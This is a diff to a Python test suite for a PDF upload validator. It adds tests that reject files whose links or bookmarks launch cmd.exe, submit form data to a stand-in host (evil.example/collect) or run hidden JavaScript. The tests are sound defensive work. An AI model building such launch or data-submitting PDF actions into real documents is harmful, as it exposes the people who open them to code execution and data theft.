@@ -11,11 +11,19 @@ from unittest.mock import patch
 from fastapi import HTTPException, UploadFile
 from fastapi.testclient import TestClient
 from pypdf import PdfReader, PdfWriter
-from pypdf.generic import DecodedStreamObject, DictionaryObject, NameObject, TextStringObject
+from pypdf.generic import (
+    ArrayObject,
+    DecodedStreamObject,
+    DictionaryObject,
+    NameObject,
+    RectangleObject,
+    TextStringObject,
+)
 
 from app.config import settings
 from app.database import get_db
 from app.dependencies import get_current_user
+from app import documents
 from app.documents import sanitize_original_name, save_document
 from app.main import app
 from app.models import Category, Condition, Document, Listing, User
@@ -40,6 +48,42 @@ def make_pdf(pages: int = 1, *, metadata: dict | None = None, js: bool = False,
         writer.add_attachment("x.exe", b"MZ")
     if user_password is not None or owner_password is not None:
         writer.encrypt(user_password=user_password or "", owner_password=owner_password, algorithm="AES-256")
+    out = io.BytesIO()
+    writer.write(out)
+    return out.getvalue()
+
+
+def action(kind: str, **entries: str) -> DictionaryObject:
+    """A PDF action such as << /S /Launch /F (cmd.exe) >>."""
+    result = DictionaryObject({NameObject("/S"): NameObject(kind)})
+    for key, value in entries.items():
+        result[NameObject(f"/{key}")] = TextStringObject(value)
+    return result
+
+
+def pdf_with_link(link_action: DictionaryObject) -> bytes:
+    """One page with a clickable area that runs the given action."""
+    writer = PdfWriter()
+    page = writer.add_blank_page(200, 200)
+    annotation = DictionaryObject({
+        NameObject("/Type"): NameObject("/Annot"),
+        NameObject("/Subtype"): NameObject("/Link"),
+        NameObject("/Rect"): RectangleObject([0, 0, 100, 100]),
+        NameObject("/A"): link_action,
+    })
+    page[NameObject("/Annots")] = ArrayObject([writer._add_object(annotation)])
+    out = io.BytesIO()
+    writer.write(out)
+    return out.getvalue()
+
+
+def pdf_with_bookmarks(count: int, javascript_at: int | None = None) -> bytes:
+    """Bookmarks are a linked list (/Next), so each one is a level deeper."""
+    writer = PdfWriter()
+    writer.add_blank_page(200, 200)
+    items = [writer.add_outline_item(f"Capítulo {i}", 0) for i in range(count)]
+    if javascript_at is not None:
+        items[javascript_at].get_object()[NameObject("/A")] = action("/JavaScript", JS="app.alert(1)")
     out = io.BytesIO()
     writer.write(out)
     return out.getvalue()
@@ -129,6 +173,35 @@ class SaveDocumentTestCase(TempDocumentsRoot):
     def test_rejects_active_content(self) -> None:
         self.assert_rejected(make_pdf(js=True), 422)
         self.assert_rejected(make_pdf(attachment=True), 422)
+
+    def test_rejects_actions_that_run_on_click(self) -> None:
+        # The action type is the VALUE of /S, not a key.
+        self.assert_rejected(pdf_with_link(action("/Launch", F="cmd.exe")), 422)
+        self.assert_rejected(pdf_with_link(action("/SubmitForm", F="https://evil.example/collect")), 422)
+        self.assert_rejected(pdf_with_link(action("/GoToR", F="other.pdf")), 422)
+
+    def test_accepts_plain_links(self) -> None:
+        saved = save_document(upload(pdf_with_link(action("/URI", URI="https://daka.example"))))
+
+        self.assertEqual(saved.page_count, 1)
+
+    def test_accepts_many_bookmarks(self) -> None:
+        # 60 bookmarks are 60+ levels deep: depth alone must not reject a file.
+        saved = save_document(upload(pdf_with_bookmarks(60)))
+
+        self.assertEqual(saved.page_count, 1)
+
+    def test_finds_javascript_however_deep_it_is_hidden(self) -> None:
+        # Bookmark 41 of 80 is ~40 links away from both ends of the list.
+        self.assert_rejected(pdf_with_bookmarks(80, javascript_at=40), 422)
+
+    def test_rejects_a_document_too_big_to_check_completely(self) -> None:
+        # Fail-closed: what the check could not see is not accepted.
+        with patch.object(documents, "MAX_WALK_NODES", 5):
+            with self.assertRaises(HTTPException) as ctx:
+                save_document(upload(pdf_with_bookmarks(10)))
+        self.assertEqual(ctx.exception.status_code, 422)
+        self.assertEqual(ctx.exception.detail, "The document is too complex to be checked.")
 
 
 class SanitizeOriginalNameTestCase(unittest.TestCase):
